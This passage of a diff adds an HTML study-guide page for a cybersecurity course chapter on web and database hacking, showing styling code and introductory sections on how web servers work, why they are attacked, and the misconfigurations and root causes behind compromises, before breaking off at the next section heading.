@@ -1,0 +1,2213 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+
+<head>
+  <link rel="icon" type="image/png" href="/assets/favicon.png?v=2">
+  <link rel="shortcut icon" href="/assets/favicon.png?v=2">
+  <link rel="apple-touch-icon" href="/assets/favicon.png?v=2">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CYS405 - Chapter 8: Web and Database Hacking</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&family=Playfair+Display:wght@700;800&display=swap"
+    rel="stylesheet">
+  <style>
+    /* ============================================================
+   THEME VARIABLES
+   ============================================================ */
+    :root {
+      --a: #6ee7f7;
+      /* cyan accent */
+      --b: #f472b6;
+      /* pink accent */
+      --c: #a78bfa;
+      /* violet accent */
+      --d: #34d399;
+      /* emerald accent */
+      --e: #fb923c;
+      /* orange accent */
+      --f: #facc15;
+      /* yellow accent */
+    }
+
+    [data-theme="dark"] {
+      --bg: #080c14;
+      --bg2: #0e1422;
+      --bg3: #141c2e;
+      --surface: rgba(255, 255, 255, 0.04);
+      --surface2: rgba(255, 255, 255, 0.07);
+      --border: rgba(255, 255, 255, 0.08);
+      --border2: rgba(255, 255, 255, 0.13);
+      --text: #e2e8f0;
+      --text2: #94a3b8;
+      --text3: #64748b;
+      --heading: #f8fafc;
+      --code-bg: rgba(255, 255, 255, 0.06);
+      --shadow: rgba(0, 0, 0, 0.5);
+      --toggle-bg: rgba(255, 255, 255, 0.08);
+    }
+
+    [data-theme="light"] {
+      --bg: #f0f4ff;
+      --bg2: #e8eef9;
+      --bg3: #dde5f5;
+      --surface: rgba(255, 255, 255, 0.75);
+      --surface2: rgba(255, 255, 255, 0.95);
+      --border: rgba(80, 100, 160, 0.12);
+      --border2: rgba(80, 100, 160, 0.2);
+      --text: #1e2a45;
+      --text2: #475569;
+      --text3: #94a3b8;
+      --heading: #0f172a;
+      --code-bg: rgba(80, 100, 160, 0.08);
+      --shadow: rgba(100, 120, 200, 0.15);
+      --toggle-bg: rgba(80, 100, 160, 0.12);
+    }
+
+    /* ============================================================
+   RESET & BASE
+   ============================================================ */
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: 'Space Grotesk', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.7;
+      overflow-x: hidden;
+      transition: background 0.4s ease, color 0.4s ease;
+    }
+
+    /* ============================================================
+   THEME TOGGLE
+   ============================================================ */
+    .theme-toggle {
+      position: fixed;
+      top: 1.25rem;
+      right: 1.5rem;
+      z-index: 1000;
+      background: var(--toggle-bg);
+      border: 1px solid var(--border2);
+      border-radius: 100px;
+      padding: 0.45rem 1rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text2);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      transition: all 0.3s ease;
+      user-select: none;
+    }
+
+    .theme-toggle:hover {
+      border-color: var(--a);
+      color: var(--a);
+      transform: scale(1.04);
+    }
+
+    .toggle-icon {
+      font-size: 1rem;
+      transition: transform 0.4s ease;
+    }
+
+    /* ============================================================
+   HERO
+   ============================================================ */
+    .hero {
+      min-height: 60vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      position: relative;
+      padding: 5rem 2rem 4rem;
+      overflow: hidden;
+    }
+
+    [data-theme="dark"] .hero {
+      background:
+        radial-gradient(ellipse 70% 50% at 20% 20%, rgba(110, 231, 247, 0.12) 0%, transparent 60%),
+        radial-gradient(ellipse 60% 50% at 80% 80%, rgba(167, 139, 250, 0.12) 0%, transparent 60%),
+        radial-gradient(ellipse 50% 40% at 50% 60%, rgba(244, 114, 182, 0.08) 0%, transparent 60%),
+        var(--bg);
+    }
+
+    [data-theme="light"] .hero {
+      background:
+        radial-gradient(ellipse 70% 50% at 20% 20%, rgba(110, 231, 247, 0.18) 0%, transparent 60%),
+        radial-gradient(ellipse 60% 50% at 80% 80%, rgba(167, 139, 250, 0.15) 0%, transparent 60%),
+        radial-gradient(ellipse 50% 40% at 50% 60%, rgba(244, 114, 182, 0.12) 0%, transparent 60%),
+        var(--bg);
+    }
+
+    .hero-grid {
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(var(--border) 1px, transparent 1px),
+        linear-gradient(90deg, var(--border) 1px, transparent 1px);
+      background-size: 50px 50px;
+      opacity: 0.7;
+    }
+
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: var(--surface2);
+      border: 1px solid var(--border2);
+      border-radius: 100px;
+      padding: 0.4rem 1.1rem;
+      font-size: 0.72rem;
+      font-weight: 600;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      color: var(--a);
+      margin-bottom: 1.75rem;
+      position: relative;
+      z-index: 1;
+      animation: fadeUp 0.7s ease both;
+    }
+
+    .badge-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--a);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        opacity: 1
+      }
+
+      50% {
+        opacity: 0.4
+      }
+    }
+
+    .hero h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(2.4rem, 5.5vw, 4.6rem);
+      font-weight: 800;
+      line-height: 1.15;
+      color: var(--heading);
+      position: relative;
+      z-index: 1;
+      animation: fadeUp 0.85s ease both;
+    }
+
+    .hero h1 .gradient-word {
+      background: linear-gradient(135deg, var(--a), var(--c), var(--b));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .hero-sub {
+      font-size: 1.05rem;
+      color: var(--text2);
+      margin-top: 1.25rem;
+      max-width: 560px;
+      position: relative;
+      z-index: 1;
+      animation: fadeUp 1s ease both;
+    }
+
+    .hero-chips {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      justify-content: center;
+      max-width: 720px;
+      margin-top: 2rem;
+      position: relative;
+      z-index: 1;
+      animation: fadeUp 1.1s ease both;
+    }
+
+    .chip {
+      padding: 0.3rem 0.85rem;
+      border-radius: 100px;
+      font-size: 0.76rem;
+      font-weight: 600;
+      border: 1px solid;
+      transition: transform 0.2s;
+    }
+
+    .chip:hover {
+      transform: translateY(-2px);
+    }
+
+    .chip-a {
+      color: var(--a);
+      border-color: rgba(110, 231, 247, 0.35);
+      background: rgba(110, 231, 247, 0.08);
+    }
+
+    .chip-b {
+      color: var(--b);
+      border-color: rgba(244, 114, 182, 0.35);
+      background: rgba(244, 114, 182, 0.08);
+    }
+
+    .chip-c {
+      color: var(--c);
+      border-color: rgba(167, 139, 250, 0.35);
+      background: rgba(167, 139, 250, 0.08);
+    }
+
+    .chip-d {
+      color: var(--d);
+      border-color: rgba(52, 211, 153, 0.35);
+      background: rgba(52, 211, 153, 0.08);
+    }
+
+    .chip-e {
+      color: var(--e);
+      border-color: rgba(251, 146, 60, 0.35);
+      background: rgba(251, 146, 60, 0.08);
+    }
+
+    .chip-f {
+      color: var(--f);
+      border-color: rgba(250, 204, 21, 0.35);
+      background: rgba(250, 204, 21, 0.08);
+    }
+
+    .scroll-hint {
+      position: absolute;
+      bottom: 2rem;
+      left: 50%;
+      transform: translateX(-50%);
+      color: var(--text3);
+      font-size: 0.72rem;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.4rem;
+      animation: bounce 2.5s infinite;
+      z-index: 1;
+    }
+
+    @keyframes bounce {
+
+      0%,
+      100% {
+        transform: translateX(-50%) translateY(0)
+      }
+
+      50% {
+        transform: translateX(-50%) translateY(8px)
+      }
+    }
+
+    @keyframes fadeUp {
+      from {
+        opacity: 0;
+        transform: translateY(24px)
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0)
+      }
+    }
+
+    /* ============================================================
+   LAYOUT
+   ============================================================ */
+    main {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 4rem 2rem;
+    }
+
+    section {
+      margin-bottom: 5.5rem;
+    }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .sec-num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.68rem;
+      font-weight: 600;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: var(--text3);
+      white-space: nowrap;
+    }
+
+    .sec-line {
+      flex: 1;
+      height: 1px;
+      background: linear-gradient(90deg, var(--border2), transparent);
+    }
+
+    h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(1.6rem, 3vw, 2.3rem);
+      font-weight: 800;
+      color: var(--heading);
+      margin-bottom: 0.4rem;
+    }
+
+    h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 700;
+      font-size: 1.05rem;
+      margin-bottom: 0.6rem;
+      color: var(--heading);
+    }
+
+    p {
+      font-size: 0.94rem;
+      color: var(--text2);
+      margin-bottom: 0.7rem;
+    }
+
+    strong {
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    /* ============================================================
+   GRADIENT TEXT HELPERS
+   ============================================================ */
+    .ga {
+      background: linear-gradient(135deg, var(--a), var(--d));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .gb {
+      background: linear-gradient(135deg, var(--b), var(--c));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .gc {
+      background: linear-gradient(135deg, var(--e), var(--b));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .gd {
+      background: linear-gradient(135deg, var(--c), var(--a));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    /* ============================================================
+   CARDS
+   ============================================================ */
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 1.6rem;
+      transition: border-color 0.3s, transform 0.3s, box-shadow 0.3s;
+    }
+
+    .card:hover {
+      border-color: var(--border2);
+      transform: translateY(-3px);
+      box-shadow: 0 12px 30px var(--shadow);
+    }
+
+    .grid2 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 1rem;
+    }
+
+    .grid3 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 1rem;
+    }
+
+    .grid4 {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+      gap: 1rem;
+    }
+
+    .bl-a {
+      border-left: 3px solid var(--a);
+    }
+
+    .bl-b {
+      border-left: 3px solid var(--b);
+    }
+
+    .bl-c {
+      border-left: 3px solid var(--c);
+    }
+
+    .bl-d {
+      border-left: 3px solid var(--d);
+    }
+
+    .bl-e {
+      border-left: 3px solid var(--e);
+    }
+
+    .bl-f {
+      border-left: 3px solid var(--f);
+    }
+
+    .ta {
+      color: var(--a);
+    }
+
+    .tb {
+      color: var(--b);
+    }
+
+    .tc {
+      color: var(--c);
+    }
+
+    .td {
+      color: var(--d);
+    }
+
+    .te {
+      color: var(--e);
+    }
+
+    .tf {
+      color: var(--f);
+    }
+
+    /* ============================================================
+   DEFINITION CARDS
+   ============================================================ */
+    .def-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 0.75rem;
+    }
+
+    .def-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1.2rem;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s;
+    }
+
+    .def-card:hover {
+      transform: translateY(-2px);
+    }
+
+    .def-top {
+      height: 2px;
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+    }
+
+    .def-term {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.78rem;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .def-desc {
+      font-size: 0.87rem;
+      color: var(--text2);
+    }
+
+    /* ============================================================
+   MONO / CODE STYLE
+   ============================================================ */
+    .mono {
+      font-family: 'JetBrains Mono', monospace;
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      font-size: 0.85rem;
+      color: var(--a);
+      margin-top: 0.75rem;
+      overflow-x: auto;
+      white-space: pre;
+    }
+
+    .mono span.comment {
+      color: var(--text3);
+    }
+
+    .mono span.key {
+      color: var(--b);
+    }
+
+    .mono span.val {
+      color: var(--d);
+    }
+
+    /* ============================================================
+   EXAMPLE BOXES
+   ============================================================ */
+    .ex {
+      border-radius: 14px;
+      padding: 1.4rem;
+      border: 1px solid;
+      margin-top: 1.25rem;
+    }
+
+    .ex-a {
+      background: rgba(110, 231, 247, 0.06);
+      border-color: rgba(110, 231, 247, 0.25);
+    }
+
+    .ex-b {
+      background: rgba(244, 114, 182, 0.06);
+      border-color: rgba(244, 114, 182, 0.25);
+    }
+
+    .ex-c {
+      background: rgba(167, 139, 250, 0.06);
+      border-color: rgba(167, 139, 250, 0.25);
+    }
+
+    .ex-d {
+      background: rgba(52, 211, 153, 0.06);
+      border-color: rgba(52, 211, 153, 0.25);
+    }
+
+    .ex-e {
+      background: rgba(251, 146, 60, 0.06);
+      border-color: rgba(251, 146, 60, 0.25);
+    }
+
+    .ex-f {
+      background: rgba(250, 204, 21, 0.06);
+      border-color: rgba(250, 204, 21, 0.25);
+    }
+
+    .ex-label {
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      margin-bottom: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .ex-label::before {
+      content: '';
+      display: inline-block;
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: currentColor;
+    }
+
+    /* ============================================================
+   TIP BOXES
+   ============================================================ */
+    .tip {
+      display: flex;
+      gap: 1rem;
+      align-items: flex-start;
+      padding: 1.1rem 1.25rem;
+      border-radius: 12px;
+      margin-top: 1rem;
+    }
+
+    .tip-green {
+      background: rgba(52, 211, 153, 0.08);
+      border: 1px solid rgba(52, 211, 153, 0.25);
+    }
+
+    .tip-blue {
+      background: rgba(110, 231, 247, 0.08);
+      border: 1px solid rgba(110, 231, 247, 0.25);
+    }
+
+    .tip-warn {
+      background: rgba(251, 146, 60, 0.08);
+      border: 1px solid rgba(251, 146, 60, 0.25);
+    }
+
+    .tip-yellow {
+      background: rgba(250, 204, 21, 0.08);
+      border: 1px solid rgba(250, 204, 21, 0.25);
+    }
+
+    .tip-icon {
+      font-size: 1.2rem;
+      flex-shrink: 0;
+      margin-top: 0.1rem;
+    }
+
+    .tip-body h4 {
+      font-size: 0.84rem;
+      font-weight: 700;
+      margin-bottom: 0.25rem;
+    }
+
+    .tip-body p {
+      font-size: 0.86rem;
+      color: var(--text2);
+      margin: 0;
+    }
+
+    /* ============================================================
+   MNEMONIC BOXES  (memory aids - distinct brain/purple styling)
+   ============================================================ */
+    .mnemonic {
+      display: flex;
+      gap: 1rem;
+      align-items: flex-start;
+      padding: 1.25rem 1.4rem;
+      border-radius: 14px;
+      margin-top: 1.25rem;
+      background: linear-gradient(135deg, rgba(167, 139, 250, 0.10), rgba(244, 114, 182, 0.07));
+      border: 1px solid rgba(167, 139, 250, 0.35);
+      position: relative;
+    }
+
+    .mnemonic-icon {
+      font-size: 1.3rem;
+      flex-shrink: 0;
+    }
+
+    .mnemonic-body h4 {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: var(--c);
+      margin-bottom: 0.4rem;
+    }
+
+    .mnemonic-body p {
+      font-size: 0.92rem;
+      color: var(--text);
+      margin: 0;
+    }
+
+    .mnemonic-body .mnem-key {
+      color: var(--b);
+      font-weight: 700;
+    }
+
+    /* ============================================================
+   TABLES
+   ============================================================ */
+    .tbl {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.87rem;
+    }
+
+    .tbl th {
+      text-align: left;
+      padding: 0.65rem 0.9rem;
+      background: var(--surface2);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.7rem;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--text3);
+      border-bottom: 1px solid var(--border2);
+    }
+
+    .tbl td {
+      padding: 0.7rem 0.9rem;
+      border-bottom: 1px solid var(--border);
+      color: var(--text);
+    }
+
+    .tbl tr:last-child td {
+      border-bottom: none;
+    }
+
+    .tbl tr:hover td {
+      background: var(--surface2);
+    }
+
+    .tbl-wrap {
+      overflow-x: auto;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+    }
+
+    /* ============================================================
+   VS (COMPARISON) CARDS
+   ============================================================ */
+    .vs {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+
+    @media(max-width:640px) {
+      .vs {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* ============================================================
+   FLOW DIAGRAM
+   ============================================================ */
+    .flow {
+      display: flex;
+      align-items: center;
+      gap: 0;
+      flex-wrap: wrap;
+      margin: 1.5rem 0;
+    }
+
+    .flow-box {
+      background: var(--surface2);
+      border: 1px solid var(--border2);
+      border-radius: 10px;
+      padding: 0.75rem 1rem;
+      font-size: 0.82rem;
+      font-weight: 600;
+      color: var(--heading);
+      text-align: center;
+      flex: 1;
+      min-width: 80px;
+    }
+
+    .flow-box.accent {
+      background: rgba(110, 231, 247, 0.12);
+      border-color: rgba(110, 231, 247, 0.4);
+      color: var(--a);
+    }
+
+    .flow-box.accent2 {
+      background: rgba(167, 139, 250, 0.12);
+      border-color: rgba(167, 139, 250, 0.4);
+      color: var(--c);
+    }
+
+    .flow-box.accent3 {
+      background: rgba(52, 211, 153, 0.12);
+      border-color: rgba(52, 211, 153, 0.4);
+      color: var(--d);
+    }
+
+    .flow-arrow {
+      font-size: 1.2rem;
+      color: var(--text3);
+      padding: 0 0.35rem;
+      flex-shrink: 0;
+    }
+
+    /* ============================================================
+   STEPS
+   ============================================================ */
+    .steps {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .step {
+      display: flex;
+      gap: 1rem;
+      align-items: flex-start;
+      padding: 1rem 1.25rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      transition: all 0.3s;
+    }
+
+    .step:hover {
+      border-color: var(--border2);
+    }
+
+    .step-num {
+      width: 30px;
+      height: 30px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 700;
+      font-size: 0.8rem;
+      flex-shrink: 0;
+      color: #000;
+      background: linear-gradient(135deg, var(--a), var(--c));
+    }
+
+    .step-body h4 {
+      font-weight: 700;
+      font-size: 0.9rem;
+      margin-bottom: 0.2rem;
+    }
+
+    .step-body p {
+      font-size: 0.86rem;
+      color: var(--text2);
+      margin: 0;
+    }
+
+    /* ============================================================
+   BADGES
+   ============================================================ */
+    .badge {
+      display: inline-block;
+      padding: 0.2rem 0.55rem;
+      border-radius: 100px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      border: 1px solid;
+    }
+
+    .badge-a {
+      color: var(--a);
+      border-color: rgba(110, 231, 247, 0.4);
+      background: rgba(110, 231, 247, 0.1);
+    }
+
+    .badge-b {
+      color: var(--b);
+      border-color: rgba(244, 114, 182, 0.4);
+      background: rgba(244, 114, 182, 0.1);
+    }
+
+    .badge-c {
+      color: var(--c);
+      border-color: rgba(167, 139, 250, 0.4);
+      background: rgba(167, 139, 250, 0.1);
+    }
+
+    .badge-e {
+      color: var(--e);
+      border-color: rgba(251, 146, 60, 0.4);
+      background: rgba(251, 146, 60, 0.1);
+    }
+
+    .row-highlight td {
+      background: rgba(52, 211, 153, 0.06) !important;
+    }
+
+    .row-warn td {
+      background: rgba(244, 114, 182, 0.06) !important;
+    }
+
+    /* ============================================================
+   FOOTER
+   ============================================================ */
+    footer {
+      text-align: center;
+      padding: 3rem 2rem 4rem;
+      position: relative;
+    }
+
+    footer::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 10%;
+      right: 10%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--border2), transparent);
+    }
+
+    .footer-name {
+      font-family: 'Playfair Display', serif;
+      font-size: 1rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--a), var(--c), var(--b));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .footer-sub {
+      font-size: 0.78rem;
+      color: var(--text3);
+      margin-top: 0.3rem;
+    }
+
+    /* UL RESET */
+    ul {
+      list-style: none;
+    }
+
+    ul li {
+      padding: 0.32rem 0;
+      padding-left: 1rem;
+      position: relative;
+      font-size: 0.9rem;
+      color: var(--text2);
+    }
+
+    ul li::before {
+      content: '▸';
+      position: absolute;
+      left: 0;
+      color: var(--c);
+      font-size: 0.65rem;
+      top: 0.44rem;
+    }
+
+    .divider {
+      width: 100%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--border), transparent);
+      margin: 4rem 0;
+    }
+
+    @media(max-width:600px) {
+      .grid4 {
+        grid-template-columns: 1fr 1fr;
+      }
+
+      .flow {
+        justify-content: center;
+      }
+
+      .flow-box {
+        min-width: 70px;
+        font-size: 0.75rem;
+      }
+    }
+  </style>
+  <script src="/javascripts/standalone-theme.js"></script>
+  <script src="/javascripts/html-theme-sync.js"></script>
+
+  <meta name="description"
+    content="A comprehensive, mnemonic-driven study guide to CYS405 Chapter 8: Web and Database Hacking - web server & web application vulnerabilities, SQL injection, XSS, DNS attacks, session hijacking, and database attack tools.">
+  <link rel="canonical"
+    href="https://shoug-tech.com/academics/cybersecurity/cys405/slide-breakdowns/08-chapter-8-web-and-database-hacking/chapter-8-web-and-database-hacking.html">
+  <meta property="og:title" content="CYS405 - Chapter 8: Web and Database Hacking">
+  <meta property="og:description"
+    content="A comprehensive, mnemonic-driven study guide to CYS405 Chapter 8: Web and Database Hacking - web server & web application vulnerabilities, SQL injection, XSS, DNS attacks, session hijacking, and database attack tools.">
+  <meta property="og:url"
+    content="https://shoug-tech.com/academics/cybersecurity/cys405/slide-breakdowns/08-chapter-8-web-and-database-hacking/chapter-8-web-and-database-hacking.html">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="https://shoug-tech.com/assets/og-banner.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="CYS405 - Chapter 8: Web and Database Hacking">
+  <meta name="twitter:description"
+    content="A comprehensive, mnemonic-driven study guide to CYS405 Chapter 8: Web and Database Hacking - web server & web application vulnerabilities, SQL injection, XSS, DNS attacks, session hijacking, and database attack tools.">
+  <meta name="twitter:image" content="https://shoug-tech.com/assets/og-banner.png">
+</head>
+
+<body>
+
+
+  <!-- THEME TOGGLE -->
+  <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle theme">
+    <span class="toggle-icon" id="toggle-icon">☀️</span>
+    <span id="toggle-label">Light Mode</span>
+  </button>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-grid"></div>
+
+    <div class="hero-badge">
+      <span class="badge-dot"></span>
+      CYS405 · Chapter 8
+    </div>
+
+    <h1>
+      Where the Front Door<br>
+      <span class="gradient-word">Meets the Back Room</span>
+    </h1>
+    <p class="hero-sub">Web and database hacking: how attackers break web servers and web applications, the classic
+      injection and hijacking attacks, and how the data behind it all - the database - gets scanned, cracked, and
+      stolen.</p>
+
+    <div class="hero-chips">
+      <span class="chip chip-a">Web Server Attacks</span>
+      <span class="chip chip-b">SQL Injection</span>
+      <span class="chip chip-c">XSS</span>
+      <span class="chip chip-d">Session Hijacking</span>
+      <span class="chip chip-e">DNS Attacks</span>
+      <span class="chip chip-f">Database Attacks</span>
+    </div>
+
+    <div class="scroll-hint">
+      scroll ↓
+    </div>
+  </div>
+
+  <main>
+
+    <!-- SECTION 1: WEB SERVER OPERATIONS -->
+    <section>
+      <div class="section-header"><span class="sec-num">01 / The Web Server</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="ga">How a Web Server Actually Works</h2>
+      <p>A <strong>web server</strong> is a computer system that stores, processes, and delivers web pages to clients
+        over <strong>HTTP</strong>. A client's browser sends an HTTP request for a resource (a page, photo, video); the
+        server pulls that content from storage or an application server and sends back an HTTP response. If it can't
+        find what was asked for, it returns an error message instead.</p>
+      <p>A web server is really a <strong>hardware/software application</strong> that hosts websites and implements the
+        client-server model: the server plays "server," the browser plays "client." Each server has a domain name and
+        IP address, can host more than one website, and any machine can become a web server if it runs the right server
+        software and has an internet connection. Servers are chosen for their ability to handle server-side
+        programming, security, and site-building/search tools - and attackers typically go after
+        <strong>vulnerable software components</strong> and <strong>configuration errors</strong> to compromise them.
+      </p>
+
+      <div class="tip tip-blue">
+        <div class="tip-icon">💡</div>
+        <div class="tip-body">
+          <h4 class="ta">Why Attackers Shifted to the Web Layer</h4>
+          <p>Firewalls, IDS, and IPS handle most network- and OS-level attacks well. That forces attackers "up the
+            stack" to web servers and web applications instead - because a web server hosting a public app is, by
+            design, reachable from anywhere on the internet. A poorly configured web server can punch a hole straight
+            through an otherwise well-designed firewall.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 2: WHY WEB SERVERS ARE TARGETED -->
+    <section>
+      <div class="section-header"><span class="sec-num">02 / Motive &amp; Root Cause</span>
+        <div class="sec-line"></div>
+      </div>
+      <h2 class="gb">Why Web Servers Get Hacked</h2>
+
+      <h3 class="ta">Common Goals Behind Web Server Hacking</h3>
+      <p>Attacker goals can be technical or purely personal:</p>
+      <div class="grid2">
+        <div class="card bl-a">
+          <h3 class="ta">Technical / Financial Goals</h3>
+          <ul>
+            <li>Stealing credit cards or credentials via phishing</li>
+            <li>Roping the server into a botnet for DoS/DDoS attacks</li>
+            <li>Compromising a database</li>
+            <li>Obtaining closed-source applications</li>
+            <li>Hiding and redirecting traffic</li>
+            <li>Escalating privileges</li>
+          </ul>
+        </div>
+        <div class="card bl-b">
+          <h3 class="tb">Personal Motives</h3>
+          <ul>
+            <li>Pure curiosity</li>
+            <li>Completing a self-set intellectual challenge</li>
+            <li>Damaging the target organization's reputation</li>
+          </ul>
+        </div>
+      </div>
+
+      <h3 class="tc" style="margin-top:1.5rem;">Dangerous Oversights That Create Vulnerable Servers</h3>
+      <p>Poorly trained admins, inadequate knowledge, negligence, laziness, and inattentiveness toward security are
+        the biggest threats to web server security. Common oversights:</p>
+      <ul>
+        <li>Not updating the web server with the latest patches</li>
+        <li>Using the same sysadmin credentials everywhere</li>
+        <li>Allowing unrestricted internal and outbound traffic</li>
+        <li>Running unhardened applications and servers</li>
+      </ul>
+
+      <h3 class="td" style="margin-top:1.5rem;">Four Perspectives on the Same Problem</h3>
+      <div class="def-grid">
+        <div class="def-card">
+          <div class="def-top" style="background:var(--a)"></div>
+          <div class="def-term ta">Webmaster</div>
+          <div class="def-desc">Web servers may expose internal networks; risks include vulnerable scripts and
+            backend code; open architecture allows server-side execution; a single flaw can compromise the server.
+          </div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--b)"></div>
+          <div class="def-term tb">Network Administrator</div>
+          <div class="def-desc">Poor configuration creates security gaps; weak authentication and access control;
+            excessive privileges granted; misconfiguration is a major attack vector.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--c)"></div>
+          <div class="def-term tc">End User</div>
+          <div class="def-desc">Users assume web browsing is safe; malicious web content can deliver malware;
+            client-side scripts can be exploited; compromised servers can attack users.</div>
+        </div>
+        <div class="def-card">
+          <div class="def-top" style="background:var(--d)"></div>
+          <div class="def-term td">Key Principle</div>
+          <div class="def-desc">A poorly configured web server can bypass firewalls entirely - network security alone
+            is not enough, web server security is critical in its own right.</div>
+        </div>
+      </div>
+
+      <h3 class="te" style="margin-top:1.5rem;">Root Causes &amp; Impact of Compromise</h3>
+      <div class="vs">
+        <div class="ex ex-e">
+          <div class="ex-label te">Root Causes</div>
+          <ul>
+            <li>Unpatched software</li>
+            <li>Poor security configuration</li>
+            <li>Vulnerable web applications</li>
+            <li>Weak authentication</li>
+            <li>Human error / administrator negligence</li>
+            <li>Lack of security awareness</li>
+            <li>Default credentials left in place</li>
+            <li>Unnecessary services enabled</li>
+          </ul>
+        </div>
+        <div class="ex ex-f">
+          <div class="ex-label tf">Impact of Compromise</div>
+          <ul>
+            <li>Data theft and tampering</li>
+            <li>Website defacement</li>
+            <li>Malware distribution</li>
+            <li>Privilege escalation</li>
+            <li>Secondary attacks against users/partners</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mnemonic">
+        <div class="mnemonic-icon">🧠</div>
+        <div class="mnemonic-body">
+          <h4>Mnemonic - Why Servers Get Popped: "PASS-U"</h4>
+          <p><span class="mnem-key">P-A-S-S-U</span> = <strong>P</strong>atching skipped,
+            <strong>A</strong>uthentication
+            weak, <strong>S</strong>ecurity misconfigured, <strong>S</strong>ervices unnecessary, <strong>U</strong>ser
+            (human) error. Five root causes, one password-shaped word.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 3: WEB SERVER VULNERABILITIES & ATTACKS -->
+    <section>
+      <div class="section-header"><span class="sec-num">03 / Web Server Attacks</span>
+        <div class="sec-line"></div>
+      </div>
